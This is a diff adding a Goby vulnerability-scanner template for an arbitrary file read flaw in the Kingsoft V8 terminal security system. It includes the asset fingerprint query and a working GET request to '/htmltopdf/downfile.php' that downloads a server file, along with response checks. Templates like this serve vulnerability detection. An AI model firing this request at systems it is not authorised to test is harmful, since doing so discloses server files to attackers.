@@ -1,0 +1,51 @@
+{
+      "Name": "Kingsoft V8 Arbitrary file read",
+      "Level": "1",
+      "Tags": [],
+      "GobyQuery": "app=\"kingsoft-V8+-Terminal-security-system\"",
+      "Description": "There is an arbitrary file reading vulnerability in Jinshan V8 terminal security system, through which attackers can download arbitrary files from the server",
+      "Product": "Kingsoft V8",
+      "Homepage": "https://www.ejinshan.net/",
+      "Author": "PeiQi",
+      "Impact": "<p>through which attackers can download arbitrary files from the server<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/htmltopdf/downfile.php?filename=downfile.php",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "$filename",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-21 21:13:15",
+      "GobyVersion": "1.8.258"
+}
